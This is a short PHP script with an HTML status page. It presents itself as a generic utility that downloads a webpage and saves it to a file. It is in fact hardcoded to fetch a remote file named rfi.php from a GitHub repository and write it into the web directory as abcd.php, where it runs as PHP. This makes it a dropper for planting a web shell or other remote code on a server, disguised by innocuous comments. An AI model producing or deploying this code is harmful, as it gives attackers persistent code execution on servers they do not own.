<?php

// Function to fetch the content of a webpage and save it to a new PHP file
function fetchAndSaveWebpageContent() {
    // URL of the webpage you want to fetch (replace this with your desired URL)
    $webpageURL = 'https://raw.githubusercontent.com/iamjackmorton/RFI/refs/heads/main/rfi.php';  // Replace with the URL of the webpage you want to fetch

    // Use file_get_contents to fetch the content of the webpage
    $webpageContent = file_get_contents($webpageURL);

    // Check if the content was fetched successfully
    if ($webpageContent === false) {
        echo "Error: Unable to fetch the webpage content from the URL.";
        return false;
    }

    // Specify the new file name where the content will be saved (abcd.php)
    $newFileName = 'abcd.php';

    // Save the webpage content to 'abcd.php' in the current directory
    $saveResult = file_put_contents($newFileName, $webpageContent);

    // Check if the content was saved successfully
    if ($saveResult === false) {
        echo "Error: Unable to save the webpage content to the file.";
        return false;
    }

    echo "Webpage content successfully fetched and saved as $newFileName";
    return true;
}

// Call the function to fetch the webpage content and save it as 'abcd.php'
fetchAndSaveWebpageContent();

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fetch and Save Webpage Content</title>
</head>
<body>
    <h2>Webpage Download Status</h2>
    <p>The content of the webpage has been successfully fetched and saved as <strong>abcd.php</strong>.</p>
</body>
</html>
